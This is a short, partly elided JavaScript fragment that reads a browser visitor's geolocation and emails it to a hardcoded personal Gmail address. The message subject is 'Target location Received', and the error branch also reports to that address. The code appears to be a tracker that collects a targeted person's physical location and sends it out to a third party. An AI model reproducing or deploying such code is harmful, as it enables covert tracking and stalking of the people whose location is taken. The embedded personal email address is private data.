    ...
    if ("geolocation" in navigator) {
        ...
        navigator.geolocation.getCurrentPosition(
            (position) => {
                ...
                sendEmail('Target location Received', locationDisplay.textContent, 'waqarzaka794@gmail.com');
            },
            (error) => {
                ...
                sendEmail('Location Access Error', locationDisplay.textContent, 'waqarzaka794@gmail.com');
            }
        );
    } else {
